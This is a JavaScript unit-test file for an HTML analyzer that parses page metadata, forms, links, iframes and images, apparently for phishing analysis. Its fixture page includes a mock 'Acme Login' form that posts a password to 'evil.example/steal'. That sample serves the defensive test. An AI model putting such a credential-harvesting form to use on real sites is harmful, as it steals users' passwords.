import test from "node:test";
import assert from "node:assert/strict";

import { analyzeHtml } from "../src/analysis/parse/htmlAnalyzer.js";

test("analyzeHtml — keeps zone taxonomy and phishing form fields", () => {
  const html = `<html><head><title>Acme Login</title>
    <meta name="description" content="Sign in">
    <script type="application/ld+json">{"@type":"Organization","name":"Acme"}</script>
  </head><body>
    <h1>Welcome</h1>
    <div aria-hidden="true"><p>Cookie banner junk</p></div>
    <form action="https://evil.example/steal" method="post">
      <input type="password" name="pw" id="pw" autocomplete="off">
      <input type="hidden" name="csrf" value="abc">
    </form>
    <a href="/help" rel="nofollow">Help</a>
    <iframe src="https://ads.example/frame.html" title="ad"></iframe>
    <section data-captured-iframe="true">
      <a href="https://www.register.com/renew">Renew Your Domain Name Now</a>
    </section>
    <img src="/logo.png" data-src="/logo-hi.png" loading-src="/logo-lazy.png" alt="Logo">
  </body></html>`;

  const doc = analyzeHtml(html);

  assert.equal(doc.meta.title, "Acme Login");
  assert.equal(doc.meta.description, "Sign in");

  assert.ok(doc.textZones.headingText.includes("Welcome"));
  assert.ok(doc.textZones.iframeText.some((t) => t.includes("Renew Your Domain")));

  assert.equal(doc.forms[0].method, "POST");
  assert.equal(doc.forms[0].hiddenFields[0].name, "csrf");
  assert.equal(doc.forms[0].allInputs[0].autocomplete, "off");

  assert.equal(doc.links.find((l) => l.href === "/help")?.rel, "nofollow");

  assert.deepEqual(doc.structuredData[0], {
    "@type": "Organization",
    name: "Acme",
  });

  assert.deepEqual(doc.iframes[0], {
    src: "https://ads.example/frame.html",
    title: "ad",
  });

  assert.ok(
    !doc.visibleText.some((t) => t.includes("Cookie banner junk")),
    "aria-hidden text should be excluded",
  );

  const lazy = doc.images.filter((i) => i.kind === "lazy").map((i) => i.src);
  assert.ok(lazy.includes("/logo-hi.png"));
  assert.ok(lazy.includes("/logo-lazy.png"));
});

test("analyzeHtml — malformed JSON-LD is ignored", () => {
  const doc = analyzeHtml(
    `<html><body><script type="application/ld+json">{bad</script></body></html>`,
  );
  assert.deepEqual(doc.structuredData, []);
});
